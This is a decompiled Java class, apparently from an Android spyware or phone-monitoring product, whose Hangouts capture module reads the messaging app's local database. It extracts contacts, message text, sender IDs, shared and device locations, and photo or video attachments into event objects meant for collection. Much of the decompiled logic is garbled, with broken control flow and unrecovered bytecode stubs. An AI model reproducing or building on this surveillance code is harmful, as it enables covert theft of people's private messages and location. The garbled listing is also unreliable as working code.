      boolean bool5 = ((String)localObject3).equalsIgnoreCase((String)localObject4);
      if (!bool5)
      {
        localObject3 = new com/vvt/events/FxIMContactEvent;
        ((FxIMContactEvent)localObject3).<init>();
        localObject4 = ((com.vvt.im.events.info.e)localObject1).c();
        ((FxIMContactEvent)localObject3).setContactDisplayName((String)localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).d();
        ((FxIMContactEvent)localObject3).setContactId((String)localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).e();
        ((FxIMContactEvent)localObject3).setContactProfilePicture((byte[])localObject4);
        localObject4 = ((com.vvt.im.events.info.e)localObject1).a();
        ((FxIMContactEvent)localObject3).setContactProfilePicturePath((String)localObject4);
        localObject1 = ((com.vvt.im.events.info.e)localObject1).f();
        ((FxIMContactEvent)localObject3).setContactStatusMessage((String)localObject1);
        long l2 = paramHangoutsData.a();
        ((FxIMContactEvent)localObject3).setEventTime(l2);
        int k = FxIMMessageServiceType.HANGOUT.getValue();
        ((FxIMContactEvent)localObject3).setImServiceId(k);
        localObject1 = paramHangoutsData.e().b();
        ((FxIMContactEvent)localObject3).setOwnerId((String)localObject1);
        localArrayList.add(localObject3);
      }
    }
    localObject3 = new java/util/ArrayList;
    ((ArrayList)localObject3).<init>();
    localObject1 = paramHangoutsData.g();
    localObject2 = ((List)localObject1).iterator();
    for (;;)
    {
      bool2 = ((Iterator)localObject2).hasNext();
      if (!bool2) {
        break;
      }
      localObject1 = (com.vvt.im.events.info.a)((Iterator)localObject2).next();
      localObject4 = new com/vvt/events/d;
      ((com.vvt.events.d)localObject4).<init>();
      localObject5 = ((com.vvt.im.events.info.a)localObject1).e();
      ((com.vvt.events.d)localObject4).b((byte[])localObject5);
      localObject5 = ((com.vvt.im.events.info.a)localObject1).a();
      ((com.vvt.events.d)localObject4).a((String)localObject5);
      localObject5 = ((com.vvt.im.events.info.a)localObject1).c();
      ((com.vvt.events.d)localObject4).b((String)localObject5);
      localObject5 = ((com.vvt.im.events.info.a)localObject1).b();
      ((com.vvt.events.d)localObject4).c((String)localObject5);
      localObject5 = ((com.vvt.im.events.info.a)localObject1).f();
      ((com.vvt.events.d)localObject4).d((String)localObject5);
      localObject1 = ((com.vvt.im.events.info.a)localObject1).d();
      ((com.vvt.events.d)localObject4).a((byte[])localObject1);
      ((List)localObject3).add(localObject4);
    }
    boolean bool2 = false;
    localObject1 = null;
    i = paramHangoutsData.i();
    int n = MessageType.ShareLocation.getNumber();
    i &= n;
    localObject4 = MessageType.ShareLocation;
    n = ((MessageType)localObject4).getNumber();
    if (i == n)
    {
      localObject1 = new com/vvt/events/e;
      ((com.vvt.events.e)localObject1).<init>();
      f = paramHangoutsData.j().d();
      ((com.vvt.events.e)localObject1).a(f);
      double d1 = paramHangoutsData.j().a();
      ((com.vvt.events.e)localObject1).a(d1);
      d1 = paramHangoutsData.j().b();
      ((com.vvt.events.e)localObject1).b(d1);
      localObject2 = paramHangoutsData.j().c();
      ((com.vvt.events.e)localObject1).a((String)localObject2);
    }
    localObject4 = new com/vvt/events/e;
    ((com.vvt.events.e)localObject4).<init>();
    localObject2 = paramHangoutsData.f().d().c();
    ((com.vvt.events.e)localObject4).a((String)localObject2);
    double d2 = paramHangoutsData.f().d().a();
    ((com.vvt.events.e)localObject4).a(d2);
    d2 = paramHangoutsData.f().d().b();
    ((com.vvt.events.e)localObject4).b(d2);
    float f = paramHangoutsData.f().d().d();
    ((com.vvt.events.e)localObject4).a(f);
    Object localObject5 = new com/vvt/events/FxIMMessageEvent;
    ((FxIMMessageEvent)localObject5).<init>();
    localObject2 = paramHangoutsData.h().a();
    ((FxIMMessageEvent)localObject5).setConversationId((String)localObject2);
    localObject2 = paramHangoutsData.c();
    Object localObject6 = HangoutsData.Direction.IN;
    if (localObject2 == localObject6) {}
    for (localObject2 = FxEventDirection.IN;; localObject2 = FxEventDirection.OUT)
    {
      ((FxIMMessageEvent)localObject5).setDirection((FxEventDirection)localObject2);
      long l3 = paramHangoutsData.a();
      ((FxIMMessageEvent)localObject5).setEventTime(l3);
      i = FxIMMessageServiceType.HANGOUT.getValue();
      ((FxIMMessageEvent)localObject5).setImServiceId(i);
      localObject2 = paramHangoutsData.b();
      ((FxIMMessageEvent)localObject5).setMessage((String)localObject2);
      ((FxIMMessageEvent)localObject5).setMessageLocation((com.vvt.events.e)localObject4);
      ((FxIMMessageEvent)localObject5).setShareLocation((com.vvt.events.e)localObject1);
      int m = paramHangoutsData.i();
      ((FxIMMessageEvent)localObject5).setTextRepresentation(m);
      localObject1 = paramHangoutsData.c();
      localObject2 = HangoutsData.Direction.IN;
      if (localObject1 == localObject2)
      {
        localObject1 = paramHangoutsData.f().a();
        ((FxIMMessageEvent)localObject5).setSenderId((String)localObject1);
      }
      localObject2 = ((List)localObject3).iterator();
      for (;;)
      {
        boolean bool3 = ((Iterator)localObject2).hasNext();
        if (!bool3) {
          break;
        }
        localObject1 = (com.vvt.events.d)((Iterator)localObject2).next();
        ((FxIMMessageEvent)localObject5).addAttachment((com.vvt.events.d)localObject1);
      }
    }
    localArrayList.add(localObject5);
    return localArrayList;
  }
  
  private static List a(String paramString1, MessageType paramMessageType, String paramString2, String paramString3, HangoutsData.Direction paramDirection, String paramString4, com.vvt.base.b paramb)
  {
    boolean bool1 = false;
    String str1 = null;
    int i = -1;
    boolean bool2 = a;
    if (bool2) {}
    bool2 = a;
    if (bool2) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = e.a;
    int m = paramMessageType.ordinal();
    int j = localObject1[m];
    Object localObject3;
    boolean bool6;
    Object localObject4;
    switch (j)
    {
    default: 
      j = 0;
      localObject1 = null;
      boolean bool5 = com.vvt.ag.b.a((String)localObject1);
      if (!bool5)
      {
        bool5 = a;
        if (bool5) {}
        localObject3 = new java/io/File;
        ((File)localObject3).<init>((String)localObject1);
        bool5 = ((File)localObject3).exists();
        if (bool5)
        {
          bool5 = true;
          String str3 = "video";
          boolean bool7 = paramString4.contains(str3);
          int n;
          if (bool7) {
            n = 3;
          }
          long l = ((File)localObject3).length();
          bool6 = a(n, paramb, l);
          bool7 = a;
          if ((bool7) && (!bool6)) {
            break label754;
          }
          localObject4 = new java/lang/StringBuilder;
          ((StringBuilder)localObject4).<init>();
          localObject3 = "photo_";
          str1 = (String)localObject3 + paramString2 + str1;
          localObject4 = new com/vvt/im/events/info/a;
          ((com.vvt.im.events.info.a)localObject4).<init>();
          ((com.vvt.im.events.info.a)localObject4).b(paramString4);
          ((com.vvt.im.events.info.a)localObject4).d((String)localObject1);
          ((com.vvt.im.events.info.a)localObject4).c((String)localObject1);
          ((com.vvt.im.events.info.a)localObject4).a(str1);
          localArrayList.add(localObject4);
          bool1 = a;
          if (!bool1) {
            break;
          }
        }
      }
      break;
    }
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      return localArrayList;
      localObject1 = HangoutsData.Direction.OUT;
      if (paramDirection == localObject1)
      {
        localObject1 = "http";
        j = paramString3.indexOf((String)localObject1);
        if (j > i) {
          str1 = a(paramString3, paramString1);
        }
      }
      for (;;)
      {
        String str4 = str1;
        str1 = ".png";
        localObject1 = str4;
        break;
        try
        {
          localObject1 = new java/io/File;
          localObject4 = new java/net/URI;
          ((URI)localObject4).<init>(paramString3);
          ((File)localObject1).<init>((URI)localObject4);
          localObject1 = ((File)localObject1).getPath();
          localObject4 = paramb.f();
          str1 = a(paramString1, paramString2, (String)localObject1, (String)localObject4);
        }
        catch (URISyntaxException localURISyntaxException1)
        {
          bool3 = b;
        }
        if (bool3)
        {
          continue;
          str1 = a(paramString3, paramString1);
        }
      }
      boolean bool3 = com.vvt.ag.b.a(paramString4);
      Object localObject2;
      if (bool3)
      {
        localObject2 = ".png";
        bool3 = paramString3.endsWith((String)localObject2);
        if (bool3) {
          paramString4 = "image/png";
        }
      }
      else
      {
        label467:
        localObject2 = HangoutsData.Direction.OUT;
        if (paramDirection != localObject2) {
          break label674;
        }
        localObject2 = "http";
        int k = paramString3.indexOf((String)localObject2);
        if (k <= i) {
          break label602;
        }
        localObject2 = a(paramString3, paramString1);
      }
      for (;;)
      {
        localObject4 = ".png";
        bool6 = paramString3.endsWith((String)localObject4);
        if (!bool6) {
          break label684;
        }
        str1 = ".png";
        break;
        localObject2 = ".jpg";
        boolean bool4 = paramString3.endsWith((String)localObject2);
        if (!bool4)
        {
          localObject2 = ".jpeg";
          bool4 = paramString3.endsWith((String)localObject2);
          if (!bool4) {}
        }
        else
        {
          paramString4 = "image/jpeg";
          break label467;
        }
        localObject2 = "mp4";
        bool4 = paramString3.endsWith((String)localObject2);
        if (!bool4) {
          break label467;
        }
        paramString4 = "video/mp4";
        break label467;
        try
        {
          label602:
          localObject2 = new java/io/File;
          localObject4 = new java/net/URI;
          ((URI)localObject4).<init>(paramString3);
          ((File)localObject2).<init>((URI)localObject4);
          localObject2 = ((File)localObject2).getPath();
          localObject4 = paramb.f();
          localObject2 = a(paramString1, paramString2, (String)localObject2, (String)localObject4);
        }
        catch (URISyntaxException localURISyntaxException2)
        {
          bool4 = b;
          if (bool4) {}
          bool4 = false;
          str2 = null;
        }
        continue;
        label674:
        String str2 = a(paramString3, paramString1);
      }
      label684:
      localObject4 = ".jpg";
      bool6 = paramString3.endsWith((String)localObject4);
      if (!bool6)
      {
        localObject4 = ".jpeg";
        bool6 = paramString3.endsWith((String)localObject4);
        if (!bool6) {}
      }
      else
      {
        str1 = ".jpeg";
        break;
      }
      localObject4 = "mp4";
      bool6 = paramString3.endsWith((String)localObject4);
      if (!bool6) {
        break;
      }
      str1 = ".mp4";
      break;
      label754:
      ((File)localObject3).delete();
      continue;
      bool1 = a;
      if (!bool1) {}
    }
  }
  
  private static boolean a(int paramInt, com.vvt.base.b paramb, long paramLong)
  {
    int i = 1;
    float f = Float.MIN_VALUE;
    boolean bool4 = false;
    long l1 = 0L;
    boolean bool5 = paramLong < l1;
    if (!bool5)
    {
      bool5 = a;
      if (!bool5) {}
    }
    label123:
    boolean bool3;
    for (bool5 = false;; bool5 = bool3)
    {
      long l2;
      if (paramInt == i)
      {
        boolean bool1 = a;
        if (bool1) {}
        l2 = paramb.b();
        bool1 = paramLong < l2;
        if (!bool1) {
          break label123;
        }
      }
      for (;;)
      {
        bool5 = a;
        if (bool5) {}
        return bool4;
        int j = 2;
        f = 2.8E-45F;
        if (paramInt == j)
        {
          boolean bool2 = a;
          if (bool2) {}
          l2 = paramb.d();
          bool2 = paramLong < l2;
          if (bool2) {}
        }
        else
        {
          label173:
          do
          {
            do
            {
              bool4 = bool5;
              break;
              int k = 3;
              f = 4.2E-45F;
              if (paramInt != k) {
                break label173;
              }
              bool3 = a;
              if (bool3) {}
              l2 = paramb.c();
              bool3 = paramLong < l2;
            } while (!bool3);
            break;
            bool3 = a;
            if (bool3) {}
            l2 = paramb.e();
            bool3 = paramLong < l2;
          } while (!bool3);
        }
      }
    }
  }
  
  public static SQLiteDatabase b(String paramString)
  {
    int i = 1;
    Object localObject;
    if (paramString == null)
    {
      boolean bool1 = a;
      if (bool1) {}
      bool1 = false;
      localObject = null;
    }
    for (;;)
    {
      return (SQLiteDatabase)localObject;
      SQLiteDatabase localSQLiteDatabase1 = a(paramString, i);
      int j = 5;
      localObject = localSQLiteDatabase1;
      int m = j;
      while ((localObject == null) && (m > 0))
      {
        boolean bool2 = a;
        if (bool2) {}
        long l = 1000L;
        SystemClock.sleep(l);
        SQLiteDatabase localSQLiteDatabase2 = a(paramString, i);
        int k = m + -1;
        m = k;
        localObject = localSQLiteDatabase2;
      }
    }
  }
  
  private static MessageType b(String paramString1, String paramString2, String paramString3)
  {
    int i = -1;
    Object localObject = MessageType.none;
    String str;
    int m;
    if (paramString2 != null)
    {
      str = "image";
      int j = paramString2.indexOf(str);
      if (j != i) {
        if (paramString3 != null)
        {
          localObject = "sticker";
          m = paramString3.indexOf((String)localObject);
          if (m != i) {
            localObject = MessageType.Sticker;
          }
        }
      }
    }
    for (;;)
    {
      boolean bool = a;
      if (bool) {}
      return (MessageType)localObject;
      if (paramString1 != null)
      {
        m = paramString1.length();
        if (m > 0)
        {
          localObject = MessageType.Text;
          continue;
        }
      }
      localObject = MessageType.none;
      continue;
      if (paramString1 != null)
      {
        m = paramString1.length();
        if (m > 0)
        {
          localObject = MessageType.Text;
          continue;
        }
      }
      localObject = MessageType.none;
      continue;
      str = "hangouts/location";
      bool = paramString2.equals(str);
      if (bool)
      {
        localObject = MessageType.ShareLocation;
      }
      else
      {
        str = "video";
        int k = paramString2.indexOf(str);
        if (k != i)
        {
          localObject = MessageType.none;
          continue;
          localObject = MessageType.Text;
        }
      }
    }
  }
  
  private static f b(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    boolean bool1 = false;
    byte[] arrayOfByte = null;
    boolean bool2 = false;
    localObject1 = null;
    boolean bool3 = a;
    if (bool3) {}
    localObject2 = new com/vvt/im/events/info/f;
    ((f)localObject2).<init>();
    arrayOfByte = new byte[0];
    com.vvt.im.events.info.c localc = new com/vvt/im/events/info/c;
    localc.<init>();
    String str1 = "";
    String str2 = "SELECT chat_id, full_name, profile_photo_url FROM participants  WHERE (chat_id = '%s')";
    int i = 1;
    try
    {
      Object localObject3 = new Object[i];
      localObject3[0] = paramString;
      str2 = String.format(str2, (Object[])localObject3);
      i = 0;
      localObject3 = null;
      localObject1 = paramSQLiteDatabase.rawQuery(str2, null);
      boolean bool4;
      int j;
      if ((localObject1 == null) || (localObject2 != null)) {
        ((Cursor)localObject2).close();
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        localException = localException;
        bool1 = b;
        if ((bool1) && (localObject1 == null)) {}
      }
    }
    finally
    {
      bool3 = false;
      localObject2 = null;
      localObject1 = localObject4;
    }
    throw ((Throwable)localObject1);
  }
  
  private static String b(String paramString1, String paramString2)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = new java/util/Date;
    ((Date)localObject1).<init>();
    long l = ((Date)localObject1).getTime();
    localObject1 = String.valueOf(l);
    Object localObject2 = ImType.HANGOUTS;
    Object localObject3 = ImMediaFileType.USER_PROFILE;
    localObject2 = com.vvt.im.a.c.a(paramString2, (ImType)localObject2, (ImMediaFileType)localObject3);
    localObject3 = new java/lang/StringBuilder;
    ((StringBuilder)localObject3).<init>();
    localObject2 = ((StringBuilder)localObject3).append((String)localObject2);
    localObject3 = File.separator;
    localObject2 = ((StringBuilder)localObject2).append((String)localObject3);
    localObject1 = (String)localObject1;
    boolean bool2 = a;
    if (bool2) {}
    bool2 = a;
    if (bool2) {}
    return (String)localObject1;
  }
  
  /* Error */
  private static String c(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_2
    //   2: iconst_1
    //   3: anewarray 4	java/lang/Object
    //   6: astore_3
    //   7: aload_3
    //   8: iconst_0
    //   9: aload_1
    //   10: aastore
    //   11: ldc_w 858
    //   14: aload_3
    //   15: invokestatic 221	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   18: astore 4
    //   20: iconst_0
    //   21: istore 5
    //   23: aconst_null
    //   24: astore_3
    //   25: aload_0
    //   26: aload 4
    //   28: aconst_null
    //   29: invokevirtual 225	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   32: astore 4
    //   34: aload 4
    //   36: invokeinterface 70 1 0
    //   41: istore 5
    //   43: iload 5
    //   45: ifeq +27 -> 72
    //   48: ldc_w 860
    //   51: astore_3
    //   52: aload 4
    //   54: aload_3
    //   55: invokeinterface 45 2 0
    //   60: istore 5
    //   62: aload 4
    //   64: iload 5
    //   66: invokeinterface 233 2 0
    //   71: astore_2
    //   72: aload 4
    //   74: ifnull +10 -> 84
    //   77: aload 4
    //   79: invokeinterface 53 1 0
    //   84: aload_2
    //   85: areturn
    //   86: astore 4
    //   88: aconst_null
    //   89: astore 4
    //   91: getstatic 17	com/vvt/capture/hangouts/d:removeFromPath	Z
    //   94: istore 5
    //   96: iload 5
    //   98: ifeq +3 -> 101
    //   101: aload 4
    //   103: ifnull -19 -> 84
    //   106: goto -29 -> 77
    //   109: astore 6
    //   111: aconst_null
    //   112: astore 4
    //   114: aload 6
    //   116: astore_2
    //   117: aload 4
    //   119: ifnull +10 -> 129
    //   122: aload 4
    //   124: invokeinterface 53 1 0
    //   129: aload_2
    //   130: athrow
    //   131: astore_2
    //   132: goto -15 -> 117
    //   135: astore_3
    //   136: goto -45 -> 91
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	139	0	paramSQLiteDatabase	SQLiteDatabase
    //   0	139	1	paramString	String
    //   1	129	2	localObject1	Object
    //   131	1	2	localObject2	Object
    //   6	49	3	localObject3	Object
    //   135	1	3	localException1	Exception
    //   18	60	4	localObject4	Object
    //   86	1	4	localException2	Exception
    //   89	34	4	localObject5	Object
    //   21	23	5	bool1	boolean
    //   60	5	5	i	int
    //   94	3	5	bool2	boolean
    //   109	6	6	localObject6	Object
    // Exception table:
    //   from	to	target	type
    //   28	32	86	java/lang/Exception
    //   28	32	109	finally
    //   34	41	131	finally
    //   54	60	131	finally
    //   64	71	131	finally
    //   91	94	131	finally
    //   34	41	135	java/lang/Exception
    //   54	60	135	java/lang/Exception
    //   64	71	135	java/lang/Exception
  }
  
  private static String c(String paramString)
  {
    Object localObject = "//";
    boolean bool = paramString.startsWith((String)localObject);
    if (bool)
    {
      localObject = new java/lang/StringBuilder;
      ((StringBuilder)localObject).<init>();
      String str = "http:";
      localObject = ((StringBuilder)localObject).append(str).append(paramString);
      paramString = ((StringBuilder)localObject).toString();
    }
    return paramString;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/hangouts/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */